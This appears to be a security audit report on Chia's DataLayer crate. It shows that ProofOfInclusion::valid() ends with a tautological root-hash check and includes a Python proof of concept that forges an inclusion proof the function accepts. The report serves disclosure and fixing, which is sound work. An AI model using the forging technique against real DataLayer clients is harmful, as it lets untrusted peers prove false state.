### Title
`ProofOfInclusion::valid()` Tautological Root-Hash Check Allows Forged DataLayer Inclusion Proofs — (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary
`ProofOfInclusion::valid()` contains a tautological final check (`existing_hash == self.root_hash()`) that is always `true` after the loop body. The function verifies only internal hash-chain consistency but never checks the proof against any externally-committed tree root. An attacker can deserialize a crafted `ProofOfInclusion` whose `node_hash` claims an arbitrary key/value pair is in the tree, populate internally-consistent layers, and `valid()` will return `true` — accepting a forged inclusion proof.

### Finding Description

`ProofOfInclusion::valid()` is implemented as follows:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()   // ← always true
}
``` [1](#0-0) 

After the loop, `existing_hash` holds the last `calculated_hash`. The loop already enforced `calculated_hash == layer.combined_hash` before advancing, so `existing_hash` equals the last `layer.combined_hash`. `root_hash()` returns exactly `last.combined_hash`:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // same value as existing_hash after the loop
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

Therefore `existing_hash == self.root_hash()` is unconditionally `true` whenever the loop completes without an early return. The function never compares the computed root against any externally-known, committed tree root.

`ProofOfInclusion` is a `Streamable` type, fully deserializable from untrusted bytes via `from_bytes()` / `from_bytes_unchecked()`, and `valid()` is exposed as a public Python binding (`py_valid`): [3](#0-2) 

The struct fields are all public and mutable from Python (`get_all`): [4](#0-3) 

The Python type stub confirms `valid()` and `root_hash()` are the only verification methods exposed to callers: [5](#0-4) 

### Impact Explanation

Any Python or Rust consumer that calls `proof.valid()` as the sole check for DataLayer inclusion is deceived into accepting a forged proof. An attacker can:

1. Pick any `node_hash` (claiming an arbitrary key/value pair is in the tree).
2. Choose arbitrary `other_hash` values per layer.
3. Compute each `combined_hash` correctly from the previous hash and the chosen sibling — making the chain internally consistent.
4. Serialize and transmit the `ProofOfInclusion`.

`valid()` returns `true`. The attacker has proven inclusion of a key/value pair that is not in the committed DataLayer tree. This matches the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, letting untrusted input prove invalid state.**

### Likelihood Explanation

`ProofOfInclusion` is a `Streamable` type accepted over the network/RPC boundary. Any DataLayer client that verifies proofs using only `proof.valid()` — without separately asserting `proof.root_hash() == known_root` — is exploitable by any unprivileged peer that can send a serialized proof. The fuzz target and all internal tests call only `proof.valid()` without a root check, suggesting the API design encourages this misuse: [6](#0-5) [7](#0-6) 

### Recommendation

1. **Fix `valid()`** to require the expected root hash as a parameter and compare against it:
   ```rust
   pub fn valid_against_root(&self, expected_root: &Hash) -> bool {
       // existing loop ...
       existing_hash == *expected_root
   }
   ```
   Or remove the tautological final line and add a separate `matches_root(expected: &Hash) -> bool` method, making the two-step verification explicit and impossible to skip.

2. **Update `root_hash()`** documentation to clearly state it returns the root claimed by the proof, not a verified root, so callers know they must compare it against a trusted source.

3. **Update all call sites** (tests, fuzz targets, Python consumers) to always assert `proof.root_hash() == blob.get_root()` or equivalent after calling `valid()`.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer, MerkleBlob, KeyId, ValueId
import hashlib

# Build a real tree with one entry
blob = MerkleBlob(blob=bytearray())
real_key   = KeyId(1)
real_value = ValueId(1)
real_hash  = bytes([0xAA] * 32)
blob.insert(real_key, real_value, real_hash)
blob.calculate_lazy_hashes()
real_root = blob.get_root()

# Forge a proof claiming KeyId(999) is in the tree
fake_node_hash = bytes([0xBB] * 32)   # hash of a non-existent leaf
fake_sibling   = bytes([0xCC] * 32)

# Compute a consistent combined_hash for one layer
combined = hashlib.sha256(b"\x02" + fake_node_hash + fake_sibling).digest()

layer = ProofOfInclusionLayer(
    other_hash_side=1,          # Side::Right
    other_hash=fake_sibling,
    combined_hash=combined,     # internally consistent
)
forged_proof = ProofOfInclusion(node_hash=fake_node_hash, layers=[layer])

assert forged_proof.valid()                    # True  ← BUG: accepts forged proof
assert forged_proof.root_hash() != real_root   # True  ← proof does not match actual tree
# A caller checking only proof.valid() is deceived.
```
